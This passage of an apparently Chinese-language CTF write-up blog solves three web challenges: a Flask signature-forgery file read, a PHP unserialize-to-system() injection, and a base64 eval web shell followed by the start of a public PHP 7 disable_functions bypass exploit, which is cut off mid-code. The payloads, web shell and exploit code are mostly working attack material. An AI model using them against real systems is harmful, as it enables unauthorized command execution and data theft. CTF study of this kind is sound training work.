class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">&#x27;latin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, action, param, sign, ip</span>):</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):  <span class=\"comment\"># SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;scan&quot;</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">                resp = scan(self.param)  <span class=\"comment\"># 此处是文件读取得注入点</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">&quot;Connection Timeout&quot;</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">&#x27;data&#x27;</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;read&quot;</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">&#x27;data&#x27;</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">&#x27;code&#x27;</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;data&#x27;</span>] = <span class=\"string\">&quot;Action Error&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">&#x27;msg&#x27;</span>] = <span class=\"string\">&quot;Sign Error&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/geneSign&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span>():</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">&quot;param&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">    action = <span class=\"string\">&quot;scan&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/De1ta&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span>():</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">&quot;action&quot;</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">&quot;param&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">&quot;sign&quot;</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;No Hacker!!!!&quot;</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;code.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span>(<span class=\"params\">param</span>):</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Connection Timeout&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span>(<span class=\"params\">action, param</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span>(<span class=\"params\">content</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span>(<span class=\"params\">param</span>):</span></span><br><span class=\"line\">    check = param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">&quot;gopher&quot;</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">&quot;file&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>简单说明思路：</p>\n<p>请求部分(代码69-78)：</p>\n<table>\n<thead>\n<tr>\n<th>获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>读取文件需要在cookie里传入参数action、sign</td>\n</tr>\n<tr>\n<td>action是执行类型，代码33行和43行指出了两种。</td>\n</tr>\n<tr>\n<td>sing是用来验证param和action的，相关函数在94行，稍后做解释</td>\n</tr>\n</tbody></table>\n<p>获取sign部分(61-66)</p>\n<table>\n<thead>\n<tr>\n<th>获取param，action固定为scan</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>返回(secert_key + param + action)组合的sign</td>\n</tr>\n</tbody></table>\n<p>所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。</p>\n<p>假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用<code>|</code>仅为说明使用，其实字符串是相连的)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txt|scan</span><br></pre></td></tr></table></figure>\n\n<p>但是我们想要使用read，可以构造param为flag.txtread</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txtread|scan</span><br></pre></td></tr></table></figure>\n\n<p>再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txt|readscan</span><br></pre></td></tr></table></figure>\n\n<p>请求/geneSign</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/geneSign?param=flag.txtread</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9017a8826b7267833f22c0f22d90fea7</span><br></pre></td></tr></table></figure>\n\n<p>得到sign以后，再去访问/De1ta</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta?param=flag.txt</span><br><span class=\"line\"></span><br><span class=\"line\">sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<hr>\n<h1 id=\"网鼎杯-2020-朱雀组-phpweb\"><a href=\"#网鼎杯-2020-朱雀组-phpweb\" class=\"headerlink\" title=\"[网鼎杯 2020 朱雀组]phpweb\"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>看源码，有一个表单和自动提交的js。表单参数为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func=date&amp;p=Y-m-d+h%3Ai%3As+a</span><br></pre></td></tr></table></figure>\n\n<p>是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class=\"line\">    function gettime($func, $p) &#123;</span><br><span class=\"line\">        $result = call_user_func($func, $p);</span><br><span class=\"line\">        $a= gettype($result);</span><br><span class=\"line\">        if ($a == &quot;string&quot;) &#123;</span><br><span class=\"line\">            return $result;</span><br><span class=\"line\">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    class Test &#123;</span><br><span class=\"line\">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class=\"line\">        var $func = &quot;date&quot;;</span><br><span class=\"line\">        function __destruct() &#123;</span><br><span class=\"line\">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class=\"line\">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class=\"line\">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($func != null) &#123;</span><br><span class=\"line\">        $func = strtolower($func);</span><br><span class=\"line\">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class=\"line\">            echo gettime($func, $p);</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            die(&quot;Hacker...&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。</p>\n<p>先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class Test &#123;</span><br><span class=\"line\">        var $p = &quot;ls ../../../../&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        var $func = &quot;system&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">$s=new Test();</span><br><span class=\"line\">echo urlencode(serialize($s));</span><br><span class=\"line\">#unserialize</span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>\n\n<p>wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">func=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>\n\n<p>最后读文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func=readfile&amp;p=../../../../tmp/flagoefiu4r93</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"GKCTF2020-CheckIN\"><a href=\"#GKCTF2020-CheckIN\" class=\"headerlink\" title=\"[GKCTF2020]CheckIN\"></a>[GKCTF2020]CheckIN</h1><p>是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phpinfo();</span><br><span class=\"line\">cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>\n\n<p>查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数</p>\n<p>可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。</p>\n<p>scandir根目录查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7</span><br></pre></td></tr></table></figure>\n\n<p>又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件</p>\n<p>传码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval($_POST[1]);</span><br><span class=\"line\">ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>\n\n<p>蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道<a href=\"https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/\">RCE ME</a>也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class=\"line\">#</span><br><span class=\"line\"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class=\"line\">#</span><br><span class=\"line\"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class=\"line\">#</span><br><span class=\"line\"># Author: https://github.com/mm0r1</span><br><span class=\"line\"></span><br><span class=\"line\">pwn(&quot;../../.././readflag&quot;);   #这里是想要执行的命令</span><br><span class=\"line\"></span><br><span class=\"line\">function pwn($cmd) &#123;</span><br><span class=\"line\">    global $abc, $helper;</span><br><span class=\"line\"></span><br><span class=\"line\">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class=\"line\">        $address = 0;</span><br><span class=\"line\">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class=\"line\">            $address &lt;&lt;= 8;</span><br><span class=\"line\">            $address |= ord($str[$p+$j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $address;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function ptr2str($ptr, $m = 8) 